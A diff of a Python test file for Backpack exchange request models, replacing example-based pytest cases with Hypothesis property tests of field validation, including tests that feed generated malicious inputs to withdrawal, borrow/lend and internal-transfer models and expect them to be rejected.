+        assert isinstance(obj, BackpackRawAccountWithdrawalRequest)
+
+        # Property: All fields should be preserved with correct types
+        assert obj.address == withdrawal_data["address"]
+        assert obj.blockchain == withdrawal_data["blockchain"]
+        assert obj.quantity == withdrawal_data["quantity"]
+        assert obj.symbol == withdrawal_data["symbol"]
+
+        # Property: Model should be configured correctly
+        assert obj.model_config.get("extra") == "forbid"
+        assert obj.model_config.get("frozen") is True
+        assert obj.model_config.get("populate_by_name") is True
+
+    @given(
+        field_name=st.sampled_from(["address", "blockchain", "quantity", "symbol"]),
+        malicious_value=malicious_payload_strategy(),
+    )
+    def test_withdrawal_request_security_boundary_properties(
+        self, field_name: str, malicious_value: Any
+    ) -> None:
+        """Property: Withdrawal request model should reject malicious inputs safely."""
+        base_data = {
             "address": "0x1234567890abcdef",
             "blockchain": "Ethereum",
             "quantity": "100.0",
-            "symbol": "INVALID_TOKEN",  # Not in allowed symbols
-        }
-        with pytest.raises(ValidationError):
-            BackpackRawAccountWithdrawalRequest(**invalid_data)
-
-    @pytest.mark.parametrize(
-        "blockchain",
-        ["Arbitrum", "Base", "Bitcoin", "Solana", "XRP"],
-    )
-    def test_valid_various_blockchains(
-        self,
-        blockchain: Literal["Arbitrum", "Base", "Bitcoin", "Solana", "XRP"],
-    ) -> None:
-        """Test valid instantiation with various blockchain options."""
-        request = BackpackRawAccountWithdrawalRequest(
-            address="test_address",
-            blockchain=blockchain,
-            quantity="10.0",
-            symbol="BTC",
-        )
-        assert request.blockchain == blockchain
-
-    @pytest.mark.parametrize(
-        "symbol",
-        ["BTC", "ETH", "SOL", "USDT", "DOGE", "ADA"],
-    )
-    def test_valid_various_symbols(
-        self,
-        symbol: Literal["BTC", "ETH", "SOL", "USDT", "DOGE", "ADA"],
-    ) -> None:
-        """Test valid instantiation with various symbol options."""
-        request = BackpackRawAccountWithdrawalRequest(
-            address="test_address",
-            blockchain="Ethereum",
-            quantity="10.0",
-            symbol=symbol,
-        )
-        assert request.symbol == symbol
-
-
-class TestBackpackRawUpdateAccountSettingsRequest:
-    """Tests for BackpackRawUpdateAccountSettingsRequest model."""
-
-    def test_valid_empty_settings(self) -> None:
-        """Test valid instantiation with no fields (all optional)."""
-        request = BackpackRawUpdateAccountSettingsRequest()
-        assert request.autoBorrowSettlements is None
-        assert request.autoLend is None
-        assert request.autoRealizePnl is None
-        assert request.autoRepayBorrows is None
-
-    def test_valid_partial_settings(self) -> None:
-        """Test valid instantiation with some fields."""
-        request = BackpackRawUpdateAccountSettingsRequest(
-            autoLend=True,
-            autoRealizePnl=False,
-        )
-        assert request.autoLend is True
-        assert request.autoRealizePnl is False
-        assert request.autoBorrowSettlements is None
-        assert request.autoRepayBorrows is None
-
-    def test_valid_all_settings(self) -> None:
-        """Test valid instantiation with all fields."""
-        request = BackpackRawUpdateAccountSettingsRequest(
-            autoBorrowSettlements=True,
-            autoLend=False,
-            autoRealizePnl=True,
-            autoRepayBorrows=False,
-        )
-        assert request.autoBorrowSettlements is True
-        assert request.autoLend is False
-        assert request.autoRealizePnl is True
-        assert request.autoRepayBorrows is False
-
-    def test_invalid_boolean_type(self) -> None:
-        """Test validation error for invalid boolean type."""
-        invalid_data: dict[str, Any] = {
-            "autoLend": "true",  # Must be bool, not string
-        }
-        with pytest.raises(TypeError):
-            BackpackRawUpdateAccountSettingsRequest(**invalid_data)
-
-
-class TestBackpackRawAccountConvertDustRequest:
-    """Tests for BackpackRawAccountConvertDustRequest model."""
-
-    def test_valid_dust_conversion(self) -> None:
-        """Test valid instantiation."""
-        request = BackpackRawAccountConvertDustRequest(symbol="BTC")
-        assert request.symbol == "BTC"
-
-    def test_invalid_symbol_literal(self) -> None:
-        """Test validation error for invalid symbol."""
-        invalid_data: dict[str, Any] = {"symbol": "INVALID_SYMBOL"}
-        with pytest.raises(ValidationError):
-            BackpackRawAccountConvertDustRequest(**invalid_data)
-
-    @pytest.mark.parametrize(
-        "symbol",
-        ["BTC", "ETH", "SOL", "USDT", "DOGE", "ADA"],
-    )
-    def test_valid_various_symbols(
-        self,
-        symbol: Literal["BTC", "ETH", "SOL", "USDT", "DOGE", "ADA"],
-    ) -> None:
-        """Test valid instantiation with various symbols."""
-        request = BackpackRawAccountConvertDustRequest(symbol=symbol)
-        assert request.symbol == symbol
-
-
-class TestBackpackRawBorrowLendExecuteRequest:
-    """Tests for BackpackRawBorrowLendExecuteRequest model."""
-
-    def test_valid_borrow_request(self) -> None:
-        """Test valid borrow request."""
-        request = BackpackRawBorrowLendExecuteRequest(
-            quantity="100.0",
-            side="Borrow",
-            symbol="USDC",
-        )
-        assert request.quantity == "100.0"
-        assert request.side == "Borrow"
-        assert request.symbol == "USDC"
-
-    @pytest.mark.parametrize(
-        "side",
-        ["Borrow", "Lend", "Repay", "Redeem"],
-    )
-    def test_valid_all_sides(self, side: Literal["Borrow", "Lend", "Repay", "Redeem"]) -> None:
-        """Test valid instantiation with all side options."""
-        request = BackpackRawBorrowLendExecuteRequest(
-            quantity="50.0",
-            side=side,
-            symbol="BTC",
-        )
-        assert request.side == side
-
-    def test_invalid_side_literal(self) -> None:
-        """Test validation error for invalid side."""
-        invalid_data: dict[str, Any] = {
-            "quantity": "100.0",
-            "side": "Invalid",  # Not in allowed literals
             "symbol": "USDC",
         }
-        with pytest.raises(ValidationError):
-            BackpackRawBorrowLendExecuteRequest(**invalid_data)
+        base_data[field_name] = malicious_value
 
-    def test_invalid_symbol_literal(self) -> None:
-        """Test validation error for invalid symbol."""
-        invalid_data: dict[str, Any] = {
+        # Property: Malicious input should be rejected
+        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
+            BackpackRawAccountWithdrawalRequest.model_validate(base_data)
+
+
+# =============================================================================
+# PROPERTY TESTS FOR BACKPACK RAW BORROW LEND REQUEST MODEL
+# =============================================================================
+
+
+class TestBackpackRawBorrowLendExecuteRequestProperties:
+    """Property-based tests for BackpackRawBorrowLendExecuteRequest validation and security."""
+
+    @given(borrow_lend_data=valid_borrow_lend_data())
+    def test_borrow_lend_validation_success_properties(
+        self, borrow_lend_data: dict[str, Any]
+    ) -> None:
+        """Property: Valid borrow/lend data should always create valid BackpackRawBorrowLendExecuteRequest objects."""
+        # Skip invalid decimal values
+        try:
+            decimal_val = Decimal(borrow_lend_data["quantity"])
+            assume(decimal_val.is_finite() and decimal_val >= 0)
+        except (ValueError, TypeError):
+            assume(False)
+
+        # Skip empty or invalid strings
+        for field in ["side", "symbol"]:
+            value = borrow_lend_data[field]
+            assume(isinstance(value, str) and value.strip())
+
+        obj = BackpackRawBorrowLendExecuteRequest.model_validate(borrow_lend_data)
+
+        # Property: Object should be created successfully
+        assert isinstance(obj, BackpackRawBorrowLendExecuteRequest)
+
+        # Property: All fields should be preserved with correct types
+        assert obj.quantity == borrow_lend_data["quantity"]
+        assert obj.side == borrow_lend_data["side"]
+        assert obj.symbol == borrow_lend_data["symbol"]
+
+        # Property: Model should be configured correctly
+        assert obj.model_config.get("extra") == "forbid"
+        assert obj.model_config.get("frozen") is True
+        assert obj.model_config.get("populate_by_name") is True
+
+    @given(
+        field_name=st.sampled_from(["quantity", "side", "symbol"]),
+        malicious_value=malicious_payload_strategy(),
+    )
+    def test_borrow_lend_security_boundary_properties(
+        self, field_name: str, malicious_value: Any
+    ) -> None:
+        """Property: Borrow/lend request model should reject malicious inputs safely."""
+        base_data = {
             "quantity": "100.0",
             "side": "Borrow",
-            "symbol": "INVALID_SYMBOL",
-        }
-        with pytest.raises(ValidationError):
-            BackpackRawBorrowLendExecuteRequest(**invalid_data)
-
-
-class TestBackpackRawRequestForQuoteRequest:
-    """Tests for BackpackRawRequestForQuoteRequest model."""
-
-    def test_valid_minimal_rfq(self) -> None:
-        """Test valid instantiation with minimal required fields."""
-        request = BackpackRawRequestForQuoteRequest(symbol=SOL_USDC_BP.value)
-        assert request.symbol == SOL_USDC_BP.value
-        assert request.quantity is None
-        assert request.quoteQuantity is None
-
-    def test_valid_with_quantity(self) -> None:
-        """Test valid instantiation with quantity."""
-        request = BackpackRawRequestForQuoteRequest(
-            symbol=BTC_USDC_BP.value,
-            quantity="1.0",
-            autoAcceptThreshold="50000.0",
-            submissionTimeMs=1640995200000,
-            expiryTimeMs=1640995260000,
-            clientId="rfq_123",
-        )
-        assert request.symbol == BTC_USDC_BP.value
-        assert request.quantity == "1.0"
-        assert request.autoAcceptThreshold == "50000.0"
-        assert request.submissionTimeMs == 1640995200000
-        assert request.expiryTimeMs == 1640995260000
-        assert request.clientId == "rfq_123"
-
-    def test_valid_with_quote_quantity(self) -> None:
-        """Test valid instantiation with quoteQuantity."""
-        request = BackpackRawRequestForQuoteRequest(
-            symbol=ETH_USDC_BP.value,
-            quoteQuantity="1000.0",
-        )
-        assert request.symbol == ETH_USDC_BP.value
-        assert request.quoteQuantity == "1000.0"
-        assert request.quantity is None
-
-    def test_invalid_quantity_format(self) -> None:
-        """Test validation error for invalid quantity format."""
-        with pytest.raises(ValidationError):
-            BackpackRawRequestForQuoteRequest(
-                symbol=SOL_USDC_BP.value,
-                quantity="not_a_number",
-            )
-
-    def test_invalid_timestamp_type(self) -> None:
-        """Test validation error for invalid timestamp type."""
-        invalid_data: dict[str, Any] = {
-            "symbol": SOL_USDC_BP.value,
-            "submissionTimeMs": "not_an_int",
-        }
-        with pytest.raises(ValidationError):
-            BackpackRawRequestForQuoteRequest(**invalid_data)
-
-
-class TestBackpackRawQuoteSubmitRequest:
-    """Tests for BackpackRawQuoteSubmitRequest model."""
-
-    def test_valid_quote_submission(self) -> None:
-        """Test valid quote submission."""
-        request = BackpackRawQuoteSubmitRequest(
-            rfqId="rfq_123",
-            side="Bid",
-            price="100.50",
-        )
-        assert request.rfqId == "rfq_123"
-        assert request.side == "Bid"
-        assert request.price == "100.50"
-        assert request.clientQuoteId is None
-
-    def test_valid_with_client_quote_id(self) -> None:
-        """Test valid quote submission with client quote ID."""
-        request = BackpackRawQuoteSubmitRequest(
-            rfqId="rfq_456",
-            side="Ask",
-            price="101.00",
-            clientQuoteId="quote_789",
-        )
-        assert request.clientQuoteId == "quote_789"
-
-    def test_invalid_side_literal(self) -> None:
-        """Test validation error for invalid side."""
-        invalid_data: dict[str, Any] = {
-            "rfqId": "rfq_123",
-            "side": "Invalid",  # Not in Literal["Bid", "Ask"]
-            "price": "100.0",
-        }
-        with pytest.raises(ValidationError):
-            BackpackRawQuoteSubmitRequest(**invalid_data)
-
-    @pytest.mark.parametrize("side", ["Bid", "Ask"])
-    def test_both_sides_valid(self, side: Literal["Bid", "Ask"]) -> None:
-        """Test both valid side options."""
-        request = BackpackRawQuoteSubmitRequest(
-            rfqId="rfq_123",
-            side=side,
-            price="100.0",
-        )
-        assert request.side == side
-
-
-class TestBackpackRawQuoteAcceptRequest:
-    """Tests for BackpackRawQuoteAcceptRequest model."""
-
-    def test_valid_quote_acceptance(self) -> None:
-        """Test valid quote acceptance."""
-        request = BackpackRawQuoteAcceptRequest(
-            rfqId="rfq_123",
-            quoteId="quote_456",
-        )
-        assert request.rfqId == "rfq_123"
-        assert request.quoteId == "quote_456"
-
-    def test_empty_strings_fail_validation(self) -> None:
-        """Test that empty strings fail validation."""
-        with pytest.raises(EmptyStringError):
-            BackpackRawQuoteAcceptRequest(
-                rfqId="",  # Empty string should fail
-                quoteId="quote_456",
-            )
-
-
-class TestBackpackRawRequestForQuoteCancelRequest:
-    """Tests for BackpackRawRequestForQuoteCancelRequest model."""
-
-    def test_valid_rfq_cancellation(self) -> None:
-        """Test valid RFQ cancellation."""
-        request = BackpackRawRequestForQuoteCancelRequest(rfqId="rfq_123")
-        assert request.rfqId == "rfq_123"
-
-    def test_empty_rfq_id_fails(self) -> None:
-        """Test that empty rfqId fails validation."""
-        with pytest.raises(EmptyStringError):
-            BackpackRawRequestForQuoteCancelRequest(rfqId="")
-
-
-class TestBackpackRawRequestForQuoteRefreshRequest:
-    """Tests for BackpackRawRequestForQuoteRefreshRequest model."""
-
-    def test_valid_minimal_refresh(self) -> None:
-        """Test valid RFQ refresh with minimal fields."""
-        request = BackpackRawRequestForQuoteRefreshRequest(rfqId="rfq_123")
-        assert request.rfqId == "rfq_123"
-        assert request.submissionTimeMs is None
-        assert request.expiryTimeMs is None
-
-    def test_valid_with_timestamps(self) -> None:
-        """Test valid RFQ refresh with timestamps."""
-        request = BackpackRawRequestForQuoteRefreshRequest(
-            rfqId="rfq_123",
-            submissionTimeMs=1640995200000,
-            expiryTimeMs=1640995260000,
-        )
-        assert request.rfqId == "rfq_123"
-        assert request.submissionTimeMs == 1640995200000
-        assert request.expiryTimeMs == 1640995260000
-
-    def test_invalid_timestamp_type(self) -> None:
-        """Test validation error for invalid timestamp type."""
-        invalid_data: dict[str, Any] = {
-            "rfqId": "rfq_123",
-            "submissionTimeMs": "not_an_int",
-        }
-        with pytest.raises(ValidationError):
-            BackpackRawRequestForQuoteRefreshRequest(**invalid_data)
-
-
-class TestBackpackRawInternalTransferRequest:
-    """Tests for BackpackRawInternalTransferRequest model."""
-
-    def test_valid_minimal_transfer(self) -> None:
-        """Test valid internal transfer with minimal fields."""
-        request = BackpackRawInternalTransferRequest(
-            symbol="USDC",
-            quantity="100.0",
-            fromAccount="SPOT",
-            toAccount="MARGIN",
-        )
-        assert request.symbol == "USDC"
-        assert request.quantity == "100.0"
-        assert request.fromAccount == "SPOT"
-        assert request.toAccount == "MARGIN"
-        assert request.clientId is None
-
-    def test_valid_with_client_id(self) -> None:
-        """Test valid internal transfer with client ID."""
-        request = BackpackRawInternalTransferRequest(
-            symbol="BTC",
-            quantity="0.5",
-            fromAccount="MARGIN",
-            toAccount="FUTURES",
-            clientId="transfer_123",
-        )
-        assert request.clientId == "transfer_123"
-
-    @pytest.mark.parametrize(
-        ("from_account", "to_account"),
-        [
-            ("SPOT", "MARGIN"),
-            ("SPOT", "FUTURES"),
-            ("MARGIN", "SPOT"),
-            ("MARGIN", "FUTURES"),
-            ("FUTURES", "SPOT"),
-            ("FUTURES", "MARGIN"),
-        ],
-    )
-    def test_valid_all_account_combinations(
-        self,
-        from_account: Literal["SPOT", "MARGIN", "FUTURES"],
-        to_account: Literal["SPOT", "MARGIN", "FUTURES"],
-    ) -> None:
-        """Test valid account type combinations."""
-        request = BackpackRawInternalTransferRequest(
-            symbol="USDC",
-            quantity="10.0",
-            fromAccount=from_account,
-            toAccount=to_account,
-        )
-        assert request.fromAccount == from_account
-        assert request.toAccount == to_account
-
-    def test_invalid_from_account_literal(self) -> None:
-        """Test validation error for invalid fromAccount."""
-        invalid_data: dict[str, Any] = {
             "symbol": "USDC",
-            "quantity": "100.0",
-            "fromAccount": "INVALID",  # Not in allowed literals
-            "toAccount": "SPOT",
         }
-        with pytest.raises(ValidationError):
-            BackpackRawInternalTransferRequest(**invalid_data)
+        base_data[field_name] = malicious_value
 
-    def test_invalid_to_account_literal(self) -> None:
-        """Test validation error for invalid toAccount."""
-        invalid_data: dict[str, Any] = {
+        # Property: Malicious input should be rejected
+        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
+            BackpackRawBorrowLendExecuteRequest.model_validate(base_data)
+
+
+# =============================================================================
+# PROPERTY TESTS FOR BACKPACK RAW INTERNAL TRANSFER REQUEST MODEL
+# =============================================================================
+
+
+class TestBackpackRawInternalTransferRequestProperties:
+    """Property-based tests for BackpackRawInternalTransferRequest validation and security."""
+
+    @given(transfer_data=valid_internal_transfer_data())
+    def test_internal_transfer_validation_success_properties(
+        self, transfer_data: dict[str, Any]
+    ) -> None:
+        """Property: Valid internal transfer data should always create valid BackpackRawInternalTransferRequest objects."""
+        # Skip invalid decimal values
+        try:
+            decimal_val = Decimal(transfer_data["quantity"])
+            assume(decimal_val.is_finite() and decimal_val >= 0)
+        except (ValueError, TypeError):
+            assume(False)
+
+        # Skip empty or invalid strings
+        for field in ["symbol", "fromAccount", "toAccount"]:
+            value = transfer_data[field]
+            assume(isinstance(value, str) and value.strip())
+
+        obj = BackpackRawInternalTransferRequest.model_validate(transfer_data)
+
+        # Property: Object should be created successfully
+        assert isinstance(obj, BackpackRawInternalTransferRequest)
+
+        # Property: All fields should be preserved with correct types
+        assert obj.symbol == transfer_data["symbol"]
+        assert obj.quantity == transfer_data["quantity"]
+        assert obj.fromAccount == transfer_data["fromAccount"]
+        assert obj.toAccount == transfer_data["toAccount"]
+
+        # Property: Model should be configured correctly
+        assert obj.model_config.get("extra") == "forbid"
+        assert obj.model_config.get("frozen") is True
+        assert obj.model_config.get("populate_by_name") is True
+
+    @given(
+        field_name=st.sampled_from(["symbol", "quantity", "fromAccount", "toAccount"]),
+        malicious_value=malicious_payload_strategy(),
+    )
+    def test_internal_transfer_security_boundary_properties(
+        self, field_name: str, malicious_value: Any
+    ) -> None:
+        """Property: Internal transfer request model should reject malicious inputs safely."""
+        base_data = {
             "symbol": "USDC",
             "quantity": "100.0",
             "fromAccount": "SPOT",
-            "toAccount": "INVALID",  # Not in allowed literals
+            "toAccount": "MARGIN",
         }
-        with pytest.raises(ValidationError):
-            BackpackRawInternalTransferRequest(**invalid_data)
+        base_data[field_name] = malicious_value
 
-    def test_same_accounts_allowed_by_model(self) -> None:
-        """Test that model allows same from/to accounts (business logic handles this)."""
-        # The raw model should allow this - business validation happens in the builder
-        request = BackpackRawInternalTransferRequest(
-            symbol="USDC",
-            quantity="100.0",
-            fromAccount="SPOT",
-            toAccount="SPOT",  # Same account - allowed by model, rejected by builder
+        # Property: Malicious input should be rejected
+        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
+            BackpackRawInternalTransferRequest.model_validate(base_data)
+
+    @given(
+        account_type=account_type_strategy(),
+        invalid_literal=st.text().filter(lambda x: x not in ["SPOT", "MARGIN", "FUTURES"]),
+    )
+    def test_internal_transfer_account_literal_validation_properties(
+        self, account_type: str, invalid_literal: str
+    ) -> None:
+        """Property: Internal transfer account type literals should validate strictly."""
+        valid_data = {
+            "symbol": "USDC",
+            "quantity": "100.0",
+            "fromAccount": account_type,
+            "toAccount": "SPOT",
+        }
+
+        # Property: Valid account types should be accepted
+        obj = BackpackRawInternalTransferRequest.model_validate(valid_data)
+        assert obj.fromAccount == account_type
+
+        # Property: Invalid account types should be rejected
+        invalid_data = valid_data.copy()
+        invalid_data["fromAccount"] = invalid_literal
+
+        with pytest.raises(ValidationError):
+            BackpackRawInternalTransferRequest.model_validate(invalid_data)
+
+
+# =============================================================================
+# INTEGRATION TESTS WITH MIXED PROPERTY SCENARIOS
+# =============================================================================
+
+
+class TestBackpackRawRequestPayloadIntegrationProperties:
+    """Integration property tests for request payload models working together."""
+
+    @given(
+        order_data=valid_order_execute_data(),
+        withdrawal_data=valid_withdrawal_request_data(),
+        transfer_data=valid_internal_transfer_data(),
+        borrow_data=valid_borrow_lend_data(),
+    )
+    def test_request_payload_models_integration_properties(
+        self,
+        order_data: dict[str, Any],
+        withdrawal_data: dict[str, Any],
+        transfer_data: dict[str, Any],
+        borrow_data: dict[str, Any],
+    ) -> None:
+        """Property: All request payload models should work consistently together."""
+        # Skip invalid data
+        try:
+            # Validate all decimal fields
+            for data, fields in [
+                (order_data, ["price", "quantity"]),
+                (withdrawal_data, ["quantity"]),
+                (transfer_data, ["quantity"]),
+                (borrow_data, ["quantity"]),
+            ]:
+                for field in fields:
+                    if field in data:
+                        decimal_val = Decimal(data[field])
+                        assume(decimal_val.is_finite() and decimal_val >= 0)
+
+            # Validate string constraints
+            for data, fields in [
+                (order_data, ["orderType", "side", "symbol"]),
+                (withdrawal_data, ["address", "blockchain", "symbol"]),
+                (transfer_data, ["symbol", "fromAccount", "toAccount"]),
+                (borrow_data, ["side", "symbol"]),
+            ]:
+                for field in fields:
+                    assume(isinstance(data[field], str) and data[field].strip())
+        except (ValueError, TypeError):
+            assume(False)
+
+        # Property: All models should be created successfully
+        order_obj = BackpackRawOrderExecuteRequest.model_validate(order_data)
+        withdrawal_obj = BackpackRawAccountWithdrawalRequest.model_validate(withdrawal_data)
+        transfer_obj = BackpackRawInternalTransferRequest.model_validate(transfer_data)
+        borrow_obj = BackpackRawBorrowLendExecuteRequest.model_validate(borrow_data)
+
+        # Property: All objects should be properly typed
+        assert isinstance(order_obj, BackpackRawOrderExecuteRequest)
+        assert isinstance(withdrawal_obj, BackpackRawAccountWithdrawalRequest)
+        assert isinstance(transfer_obj, BackpackRawInternalTransferRequest)
+        assert isinstance(borrow_obj, BackpackRawBorrowLendExecuteRequest)
+
+    @given(
+        complete_malicious_data=st.dictionaries(
+            st.sampled_from([
+                "orderType",
+                "side",
+                "symbol",
+                "price",
+                "quantity",
+                "clientId",
+                "address",
+                "blockchain",
+                "fromAccount",
+                "toAccount",
+            ]),
+            malicious_payload_strategy(),
+            min_size=3,
+            max_size=8,
         )
-        assert request.fromAccount == request.toAccount == "SPOT"
+    )
+    def test_request_payload_models_adversarial_input_properties(
+        self, complete_malicious_data: dict[str, Any]
+    ) -> None:
+        """Property: All request payload models should safely handle complete adversarial input."""
+        # Property: Complete adversarial input should be safely rejected by all models
+
+        # Test BackpackRawOrderExecuteRequest
+        if all(key in complete_malicious_data for key in ["orderType", "side", "symbol"]):
+            with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
+                BackpackRawOrderExecuteRequest.model_validate({
+                    "orderType": complete_malicious_data["orderType"],
+                    "side": complete_malicious_data["side"],
+                    "symbol": complete_malicious_data["symbol"],
+                })
+
+        # Test BackpackRawAccountWithdrawalRequest
+        if all(
+            key in complete_malicious_data
+            for key in ["address", "blockchain", "quantity", "symbol"]
+        ):
+            with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
+                BackpackRawAccountWithdrawalRequest.model_validate({
+                    "address": complete_malicious_data["address"],
+                    "blockchain": complete_malicious_data["blockchain"],
+                    "quantity": complete_malicious_data["quantity"],
+                    "symbol": complete_malicious_data["symbol"],
+                })
+
+        # Test BackpackRawInternalTransferRequest
+        if all(
+            key in complete_malicious_data
+            for key in ["symbol", "quantity", "fromAccount", "toAccount"]
+        ):
+            with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
+                BackpackRawInternalTransferRequest.model_validate({
+                    "symbol": complete_malicious_data["symbol"],
+                    "quantity": complete_malicious_data["quantity"],
+                    "fromAccount": complete_malicious_data["fromAccount"],
+                    "toAccount": complete_malicious_data["toAccount"],
+                })
+
+
+# =============================================================================
+# LEGACY COMPATIBILITY TESTS
+# =============================================================================
+
+
+def test_BackpackRawOrderExecuteRequest_real_world_example() -> None:
+    """Test with real-world order execute data."""
+    payload = {
+        "orderType": "Limit",
+        "side": "Bid",
+        "symbol": "BTC_USDC",
+        "price": "50000.0",
+        "quantity": "1.0",
+        "clientId": 12345,
+        "postOnly": True,
+        "timeInForce": "GTC",
+    }
+    obj = BackpackRawOrderExecuteRequest.model_validate(payload)
+    assert obj.orderType == "Limit"
+    assert obj.side == "Bid"
+    assert obj.symbol == "BTC_USDC"
+    assert obj.price == "50000.0"
+    assert obj.quantity == "1.0"
+    assert obj.clientId == 12345
+    assert obj.postOnly is True
+    assert obj.timeInForce == "GTC"
+
+
+def test_BackpackRawOrderCancelRequest_real_world_example() -> None:
+    """Test with real-world order cancel data."""
+    payload = {
+        "symbol": "ETH_USDC",
+        "orderId": "order_123",
+        "clientId": 456,
+    }
+    obj = BackpackRawOrderCancelRequest.model_validate(payload)
+    assert obj.symbol == "ETH_USDC"
+    assert obj.orderId == "order_123"
+    assert obj.clientId == 456
+
+
+def test_BackpackRawAccountWithdrawalRequest_real_world_example() -> None:
+    """Test with real-world withdrawal request data."""
+    payload = {
+        "address": "0x1234567890abcdef",
+        "blockchain": "Ethereum",
+        "quantity": "100.0",
+        "symbol": "USDC",
+        "clientId": "withdrawal_123",
+        "twoFactorToken": "2fa_token",
+    }
+    obj = BackpackRawAccountWithdrawalRequest.model_validate(payload)
+    assert obj.address == "0x1234567890abcdef"
+    assert obj.blockchain == "Ethereum"
+    assert obj.quantity == "100.0"
+    assert obj.symbol == "USDC"
+    assert obj.clientId == "withdrawal_123"
+    assert obj.twoFactorToken == "2fa_token"
+
+
+def test_BackpackRawBorrowLendExecuteRequest_real_world_example() -> None:
+    """Test with real-world borrow/lend data."""
+    payload = {
+        "quantity": "100.0",
+        "side": "Borrow",
+        "symbol": "USDC",
+    }
+    obj = BackpackRawBorrowLendExecuteRequest.model_validate(payload)
+    assert obj.quantity == "100.0"
+    assert obj.side == "Borrow"
+    assert obj.symbol == "USDC"
+
+
+def test_BackpackRawInternalTransferRequest_real_world_example() -> None:
+    """Test with real-world internal transfer data."""
+    payload = {
+        "symbol": "USDC",
+        "quantity": "100.0",
+        "fromAccount": "SPOT",
+        "toAccount": "MARGIN",
+        "clientId": "transfer_123",
+    }
+    obj = BackpackRawInternalTransferRequest.model_validate(payload)
+    assert obj.symbol == "USDC"
+    assert obj.quantity == "100.0"
+    assert obj.fromAccount == "SPOT"
+    assert obj.toAccount == "MARGIN"
+    assert obj.clientId == "transfer_123"
+
+
+def test_BackpackRawOrderExecuteRequest_market_order_example() -> None:
+    """Test with market order (no price required)."""
+    payload = {
+        "orderType": "Market",
+        "side": "Ask",
+        "symbol": "SOL_USDC",
+        "quantity": "10.0",
+    }
+    obj = BackpackRawOrderExecuteRequest.model_validate(payload)
+    assert obj.orderType == "Market"
+    assert obj.side == "Ask"
+    assert obj.symbol == "SOL_USDC"
+    assert obj.quantity == "10.0"
+    assert obj.price is None
+
+
+def test_BackpackRawOrderExecuteRequest_complex_order_example() -> None:
+    """Test with complex order with all optional fields."""
+    payload = {
+        "orderType": "Limit",
+        "side": "Bid",
+        "symbol": "ETH_USDC",
+        "price": "1800.0",
+        "quantity": "5.0",
+        "clientId": 789,
+        "postOnly": False,
+        "reduceOnly": True,
+        "selfTradePrevention": "RejectMaker",
+        "timeInForce": "IOC",
+        "triggerPrice": "1750.0",
+        "stopLossTriggerPrice": "1700.0",
+        "stopLossTriggerBy": "MarkPrice",
+        "takeProfitTriggerPrice": "2000.0",
+        "takeProfitTriggerBy": "LastPrice",
+    }
+    obj = BackpackRawOrderExecuteRequest.model_validate(payload)
+    assert obj.reduceOnly is True
+    assert obj.selfTradePrevention == "RejectMaker"
+    assert obj.timeInForce == "IOC"
+    assert obj.triggerPrice == "1750.0"
+    assert obj.stopLossTriggerPrice == "1700.0"
+    assert obj.stopLossTriggerBy == "MarkPrice"
+    assert obj.takeProfitTriggerPrice == "2000.0"
+    assert obj.takeProfitTriggerBy == "LastPrice"
+
+
+def test_BackpackRawAccountWithdrawalRequest_different_blockchain_example() -> None:
+    """Test with different blockchain options."""
+    payload = {
+        "address": "bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4",
+        "blockchain": "Bitcoin",
+        "quantity": "0.1",
+        "symbol": "BTC",
+    }
+    obj = BackpackRawAccountWithdrawalRequest.model_validate(payload)
+    assert obj.blockchain == "Bitcoin"
+    assert obj.symbol == "BTC"
+
+
+def test_BackpackRawInternalTransferRequest_all_account_types_example() -> None:
+    """Test with all account type combinations."""
+    payload = {
+        "symbol": "BTC",
+        "quantity": "0.01",
+        "fromAccount": "FUTURES",
+        "toAccount": "SPOT",
+    }
+    obj = BackpackRawInternalTransferRequest.model_validate(payload)
+    assert obj.fromAccount == "FUTURES"
+    assert obj.toAccount == "SPOT"
